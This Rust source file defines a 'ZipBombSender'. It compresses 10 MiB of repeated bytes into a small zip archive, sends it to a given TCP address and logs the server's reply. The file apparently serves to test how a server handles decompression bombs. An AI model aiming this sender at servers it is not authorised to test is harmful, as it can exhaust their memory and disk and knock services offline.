use crate::error::*;
use std::{
    io::{Read, Write},
    net::SocketAddr,
    str::from_utf8,
};
use tracing::{debug, info};
use zip::{write::FileOptions, CompressionMethod};

pub struct ZipBombSender {
    addr: SocketAddr,
}

lazy_static::lazy_static! {
    static ref ZIP_BOMB_CONTENT: Vec<u8> =  ZipBombSender::create_zip_bomb();
}

impl ZipBombSender {
    pub fn new(addr: SocketAddr) -> Self {
        info!(target = %addr, "ZipBombSender created");
        Self { addr }
    }

    fn create_zip_bomb() -> Vec<u8> {
        // use the zip crate to create a zip bomb
        let buf = Vec::new();
        let cursor = std::io::Cursor::new(buf);
        let mut zip = zip::ZipWriter::new(cursor);
        zip.start_file(
            "file.txt",
            FileOptions::default().compression_method(CompressionMethod::Deflated),
        )
        .unwrap();
        zip.write_all(vec![b'a'; 10 * 1024 * 1024].as_slice())
            .expect("Failed to write to zip file");
        let cursor = zip.finish().unwrap();
        // return the zip bomb content
        let zip_content = cursor.into_inner();
        debug!(size = zip_content.len(), "Created zip bomb");
        zip_content
    }

    pub fn send_zip_bomb(&self) -> MyResult<()> {
        let zip_content = &*ZIP_BOMB_CONTENT;

        let mut stream = std::net::TcpStream::connect(self.addr)?;
        stream.write(format!("{}\n", zip_content.len()).as_bytes())?;
        stream.write_all(zip_content)?;
        let mut buffer = Vec::new();
        let response = stream.read_to_end(&mut buffer)?;
        let leading_data = from_utf8(
            &buffer[0..{
                if response > 100 {
                    100
                } else {
                    response
                }
            }],
        );
        debug!(size = response, content = ?leading_data, "Received response from server");
        Ok(())
    }
}
